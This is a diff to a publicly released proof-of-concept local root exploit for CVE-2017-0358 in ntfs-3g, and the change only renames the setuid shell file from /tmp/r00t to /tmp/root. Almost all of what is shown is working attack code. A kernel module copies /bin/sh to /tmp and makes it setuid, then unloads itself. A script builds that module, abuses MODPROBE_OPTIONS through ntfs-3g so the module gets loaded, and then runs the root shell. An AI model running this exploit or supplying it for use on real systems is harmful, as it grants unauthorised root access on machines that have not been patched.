@@ -32,7 +32,7 @@ MODULE_DESCRIPTION("PoC for CVE-2017-0358 from Google Project Zero");
 int init_module(void) {
   printk(KERN_INFO "[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\n");
   char *envp[] = { "HOME=/tmp", NULL };
-  char *argv[] = { "/bin/sh", "-c", "/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t", NULL };
+  char *argv[] = { "/bin/sh", "-c", "/bin/cp /bin/sh /tmp/root; /bin/chmod u+s /tmp/root", NULL };
   call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
   char *argvv[] = { "/bin/sh", "-c", "/sbin/rmmod cve_2017_0358", NULL };
   call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);
@@ -57,8 +57,8 @@ EOF
 make 1>/dev/null 2>/dev/null || echo "[-] FAILED: your need make / build tools"
 cp "/lib/modules/${un}/modules.dep.bin" . || echo "[-] FAILED: linux-image location non-default?"
 MODPROBE_OPTIONS="-v -d ${cwd}" ntfs-3g /dev/null /dev/null 1>/dev/null 2>/dev/null
-/tmp/r00t -c 'whoami' | egrep -q 'root' && echo "[+] SUCCESS: You have root. Don't be evil :)"
-/tmp/r00t
+/tmp/root -c 'whoami' | egrep -q 'root' && echo "[+] SUCCESS: You have root. Don't be evil :)"
+/tmp/root
 
 echo << 'EOF'
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
